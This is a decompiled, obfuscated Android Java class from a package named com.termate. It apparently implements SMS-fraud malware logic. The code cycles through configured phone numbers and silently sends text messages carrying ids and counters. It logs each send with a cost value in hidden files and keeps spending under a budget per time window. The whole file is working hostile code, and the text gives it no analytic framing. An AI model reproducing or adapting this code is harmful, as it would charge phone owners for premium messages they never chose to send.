package com.termate;

import android.app.Activity;
import android.telephony.SmsManager;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Hashtable;
import java.util.Vector;

public final class c
{
  private a a;
  private Activity b;
  private int c = 0;
  private boolean[] d;
  private int e = 0;
  private int f = 0;
  private Vector g = new Vector();
  
  public c(Activity paramActivity, a paramA)
  {
    this.b = paramActivity;
    this.a = paramA;
    try
    {
      a(this.b.openFileInput("l"));
      try
      {
        paramActivity = new DataInputStream(this.b.openFileInput("r"));
        this.e = paramActivity.readInt();
        this.f = paramActivity.readInt();
        this.e += 1;
        if (this.e > 99) {
          this.e = 99;
        }
        f();
        this.d = new boolean[paramA.a.length];
        return;
      }
      catch (Exception paramActivity)
      {
        for (;;) {}
      }
    }
    catch (Exception paramActivity)
    {
      for (;;) {}
    }
  }
  
  private static String a(int paramInt)
  {
    for (String str = "" + paramInt; str.length() < 2; str = "0" + str) {}
    return str;
  }
  
  private void a(FileInputStream paramFileInputStream)
  {
    paramFileInputStream = new DataInputStream(paramFileInputStream);
    int j = paramFileInputStream.readInt();
    this.g.removeAllElements();
    int i = 0;
    while (i < j)
    {
      e localE = new e(paramFileInputStream);
      this.g.addElement(localE);
      i += 1;
    }
  }
  
  private static boolean a(String paramString1, String paramString2)
  {
    try
    {
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      for (;;)
      {
        Log.e("Logic", "Error sending sms ", paramString1);
      }
    }
  }
  
  private void d()
  {
    this.c += 1;
    if (this.c >= this.a.a.length) {
      this.c = 0;
    }
  }
  
  private boolean e()
  {
    int i = 0;
    while (i < this.d.length)
    {
      if (this.d[i] == 0) {
        return false;
      }
      i += 1;
    }
    return true;
  }
  
  private void f()
  {
    try
    {
      FileOutputStream localFileOutputStream = this.b.openFileOutput("r", 0);
      DataOutputStream localDataOutputStream = new DataOutputStream(localFileOutputStream);
      localDataOutputStream.writeInt(this.e);
      localDataOutputStream.writeInt(this.f);
      localFileOutputStream.close();
      return;
    }
    catch (Exception localException) {}
  }
  
  private void g()
  {
    try
    {
      DataOutputStream localDataOutputStream1 = new DataOutputStream(this.b.openFileOutput("l", 0));
      localDataOutputStream1.writeInt(this.g.size());
      int i = 0;
      while (i < this.g.size())
      {
        e localE = (e)this.g.elementAt(i);
        ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
        DataOutputStream localDataOutputStream2 = new DataOutputStream(localByteArrayOutputStream);
        localDataOutputStream2.writeLong(localE.a);
        localDataOutputStream2.writeUTF(localE.b);
        localDataOutputStream2.writeInt(localE.c);
        localDataOutputStream1.write(localByteArrayOutputStream.toByteArray());
        i += 1;
      }
      return;
    }
    catch (Exception localException) {}
  }
  
  public final boolean a()
  {
    if (this.d[this.c] != 0)
    {
      if (e()) {
        return false;
      }
      do
      {
        d();
      } while (this.d[this.c] != 0);
    }
    if (!b()) {
      return true;
    }
    String str = this.a.a[this.c];
    if (this.a.g.containsKey("sid")) {}
    for (Object localObject = this.a.b[this.c] + " " + (String)this.a.g.get("sid");; localObject = this.a.b[this.c] + " " + this.a.f + new StringBuilder().append(a(this.e)).append(a(this.f)).toString())
    {
      a(str, (String)localObject);
      this.d[this.c] = true;
      if (this.d[this.c] != 0)
      {
        localObject = this.a.a[this.c];
        int i = this.a.c[this.c];
        localObject = new e(System.currentTimeMillis(), (String)localObject, i);
        this.g.addElement(localObject);
        g();
        this.f += 1;
        if (this.f > 98) {
          this.f = 98;
        }
        f();
      }
      d();
      return true;
    }
  }
  
  public final boolean b()
  {
    int i = this.a.e;
    long l1 = System.currentTimeMillis();
    long l2 = i * 1000;
    i = 0;
    int k;
    for (int j = 0; i < this.g.size(); j = k)
    {
      e localE = (e)this.g.elementAt(i);
      k = j;
      if (localE.a >= l1 - l2) {
        k = j + localE.c;
      }
      i += 1;
    }
    while (this.a.c[this.c] + j > this.a.d)
    {
      this.d[this.c] = true;
      d();
      if (e()) {
        return false;
      }
    }
    return true;
  }
  
  public final void c()
  {
    Log.d("Logic", "========== Log ============");
    Log.d("Logic", "count = " + this.g.size());
    int i = 0;
    for (;;)
    {
      if (i < this.g.size())
      {
        e localE = (e)this.g.elementAt(i);
        if (localE == null) {}
        try
        {
          Log.d("Logic", "null");
        }
        catch (Exception localException) {}
        Log.d("Logic", localE.toString());
      }
      else
      {
        Log.d("Logic", "========== Log ok =========");
        return;
      }
      i += 1;
    }
  }
}
